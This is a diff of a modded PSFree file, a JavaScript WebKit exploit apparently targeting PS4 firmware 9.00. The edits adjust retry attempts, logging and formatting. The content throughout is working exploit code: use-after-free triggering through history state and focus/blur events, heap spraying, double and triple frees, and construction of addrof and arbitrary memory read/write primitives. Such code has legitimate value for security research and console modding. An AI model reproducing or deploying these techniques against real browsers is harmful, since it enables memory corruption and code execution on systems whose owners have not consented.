@@ -1,6 +1,6 @@
-This file is part of PSFree. /* Copyright (C) 2023-2024 anonymous
+/* Copyright (C) 2023-2024 anonymous
 
-Se agregó  reintentos del xploit para que no muestre error die en psfree, & contador de segundos para el webkit. by @mour0ne
+This file is part of PSFree. mod by @mour0ne
 
 PSFree is free software: you can redistribute it and/or modify
 it under the terms of the GNU Affero General Public License as
@@ -15,11 +15,12 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-
 const ps4_9_00 = 2;
 const target = ps4_9_00;
 const ssv_len = 0x50;
+
 const num_reuse = 0x4000;
+
 const js_butterfly = 0x8;
 const view_m_vector = 0x10;
 const view_m_length = 0x18;
@@ -29,17 +30,20 @@ const strimpl_strlen = 4;
 const strimpl_m_data = 8;
 const strimpl_inline_str = 0x14;
 const size_strimpl = 0x18;
+
 const original_strlen = ssv_len - size_strimpl;
 const buffer_len = 0x20;
+
 const num_str = 0x4000;
 const num_gc = 30;
 const num_space = 19;
 const original_loc = window.location.pathname;
 const loc = original_loc + '#foo';
+
 let rstr = null;
 let view_leak_arr = [];
 let jsview = [];
-let s1 = { views: [] };
+let s1 = {views: []};
 let view_leak = null;
 
 let input = document.body.appendChild(document.createElement("input"));
@@ -51,14 +55,14 @@ foo.id = "foo";
 let pressure = null;
 
 function gc(num_loop) {
-    pressure = Array(100);
-    for (let i = 0; i < num_loop; i++) {
-        for (let i = 0; i < pressure.length; i++) {
-            pressure[i] = new Uint32Array(0x40000);
-        }
-        pressure = Array(100);
-    }
-    pressure = null;
+   pressure = Array(100);
+   for (let i = 0; i < num_loop; i++) {
+       for (let i = 0; i < pressure.length; i++) {
+           pressure[i] = new Uint32Array(0x40000);
+       }
+       pressure = Array(100);
+   }
+   pressure = null;
 }
 
 function sleep(ms) {
@@ -70,7 +74,9 @@ function prepare_uaf() {
     for (let i = 0; i < num_space; i++) {
         history.replaceState('state0', '');
     }
+
     history.replaceState("state1", "", loc);
+
     history.pushState("state2", "");
     for (let i = 0; i < num_space; i++) {
         history.replaceState("state2", "");
@@ -79,6 +85,7 @@ function prepare_uaf() {
 
 function free(save) {
     history.replaceState('state3', '', original_loc);
+
     for (let i = 0; i < num_reuse; i++) {
         let view = new Uint8Array(new ArrayBuffer(ssv_len));
         for (let i = 0; i < view.length; i++) {
@@ -90,8 +97,10 @@ function free(save) {
 
 function check_spray(views) {
     if (views.length !== num_reuse) {
+        debug_log(`views.length: ${views.length}`);
         die('views.length !== num_reuse, restart the entire exploit');
     }
+
     for (let i = 0; i < num_reuse; i++) {
         if (views[i][0] !== 0x41) {
             return i;
@@ -110,14 +119,14 @@ async function use_after_free(pop_func, save) {
             }
             resolve();
         }
-        addEventListener("popstate", pop_wrapper, { once: true });
+        addEventListener("popstate", pop_wrapper, {once:true});
     });
 
     prepare_uaf();
 
     let num_free = 0;
     function onblur() {
-        if (num_free > 0) {
+        if (num_free > 0)  {
             die('multiple free()s, restart the entire exploit');
         }
         free(save);
@@ -126,16 +135,17 @@ async function use_after_free(pop_func, save) {
 
     input.onblur = onblur;
     await new Promise((resolve) => {
-        input.addEventListener('focus', resolve, { once: true });
+        input.addEventListener('focus', resolve, {once:true});
         input.focus();
     });
     history.back();
-
+    
     await pop_promise;
 }
 
 async function setup_ar(save) {
     const view = save.ab;
+
     view[0] = 1;
     for (let i = 1; i < view.length; i++) {
         view[i] = 0;
@@ -145,9 +155,12 @@ async function setup_ar(save) {
     delete save.pop;
     gc(num_gc);
 
+    let total_sleep = 0;
     const num_sleep = 2;
     while (true && target !== ps4_9_00) {
         await sleep(num_sleep);
+        total_sleep += num_sleep;
+
         if (view[0] !== 1) {
             break;
         }
@@ -157,10 +170,11 @@ async function setup_ar(save) {
     while (true) {
         const obj = {};
         num_spray++;
+
         for (let i = 0; i < num_str; i++) {
             let str = new String(
-                'B'.repeat(original_strlen - 5) +
-                i.toString().padStart(5, '0')
+                'B'.repeat(original_strlen - 5)
+                + i.toString().padStart(5, '0')
             );
             obj[str] = 0x1337;
         }
@@ -171,18 +185,26 @@ async function setup_ar(save) {
             continue;
         }
 
+        let found = false;
         const str_arr = Object.getOwnPropertyNames(obj);
         for (let i = 0; i < str_arr.length; i++) {
             if (str_arr[i].length > 0xff) {
                 rstr = str_arr[i];
-                return;
+                found = true;
+                break;
             }
         }
+        if (!found) {
+            continue;
+        }
+
+        return;
     }
 }
 
 async function double_free(save) {
     const view = save.ab;
+
     await setup_ar(save);
 
     let buffer = new ArrayBuffer(buffer_len);
@@ -244,9 +266,11 @@ async function double_free(save) {
 
     let rstr_addr = read64(view, strimpl_m_data);
     write64(view, strimpl_m_data, view_leak);
+
     for (let i = 0; i < 4; i++) {
         jsview.push(sread64(rstr, i * 8));
     }
+
     write64(view, strimpl_m_data, rstr_addr);
     write32(view, strimpl_strlen, original_strlen);
 }
@@ -280,6 +304,7 @@ class Reader {
         this.leaker = leaker;
         this.leaker_addr = leaker_addr;
         this.old_m_data = read64(view_rstr, strimpl_m_data);
+
         leaker.a = 0;
     }
 
@@ -289,10 +314,14 @@ class Reader {
         }
 
         this.leaker.a = obj;
+
         write64(this.view_rstr, strimpl_m_data, this.leaker_addr);
+
         const butterfly = sread64(this.rstr, js_butterfly);
         write64(this.view_rstr, strimpl_m_data, butterfly.sub(0x10));
+
         const res = sread64(this.rstr, 0);
+
         write64(this.view_rstr, strimpl_m_data, this.old_m_data);
         return res;
     }
@@ -301,8 +330,10 @@ class Reader {
         if (!ArrayBuffer.isView(view)) {
             throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
         }
+
         write64(this.view_rstr, strimpl_m_data, this.addrof(view));
         const res = sread64(this.rstr, view_m_vector);
+
         write64(this.view_rstr, strimpl_m_data, this.old_m_data);
         return res;
     }
@@ -401,14 +432,20 @@ async function setup_arw(save, ssv_data) {
 
     for (const msg of msgs) {
         if (msg.data !== '') {
+            debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');
+
             const u = new Uint8Array(msg.data);
+
             const mem = new Memory(u, worker);
+
             view.set(copy);
+
             view_leak_arr = null;
             view_leak = null;
             jsview = null;
             input = null;
             foo = null;
+
             return;
         }
     }
@@ -419,6 +456,7 @@ async function triple_free(save, jsview, view_leak_arr, leaked_view_addr) {
     const leaker = find_leaked_view(rstr, save.ab, jsview[2], view_leak_arr);
     let r = new Reader(rstr, save.ab, leaker, leaked_view_addr);
     const ssv_data = setup_ssv_data(r);
+
     r = null;
     await setup_arw(save, ssv_data);
 }
@@ -434,7 +472,7 @@ function pop(event, save) {
 }
 
 async function get_ready() {
-    await new Promise((resolve) => {
+    await new Promise((resolve, reject) => {
         if (document.readyState !== "complete") {
             document.addEventListener("DOMContentLoaded", resolve);
             return;
@@ -444,11 +482,11 @@ async function get_ready() {
 }
 
 async function run_psfree(attempt = 1) {
-    const max_attempts = 5; // Número máximo de intentos
+    const max_attempts = 3;
 
+    debug_log(`[ PSFree - Attempt ${attempt} ]`);
+    
     try {
-       // debug_log(`[ PSFree - Attempt ${attempt} ]`);
-
         debug_log('[ PSFree - Step 0 ]');
         await get_ready();
 
@@ -523,11 +561,11 @@ async function run_psfree(attempt = 1) {
         window.p = prim;
         run_hax();
     } catch (error) {
-        // debug_log(`[!] Error: ${error.message}`);
-
+        debug_log(`[!] Error: ${error.message}`);
+        
         if (attempt < max_attempts) {
-           // debug_log(`[Retry] Attempt ${attempt + 1}`);
-            await sleep(1000); // Espera antes de reintentar
+            debug_log(`[Retry] Attempt ${attempt + 1}`);
+            await sleep(1000);
             return run_psfree(attempt + 1);
         } else {
             die('PSFree exploit failed after multiple attempts');
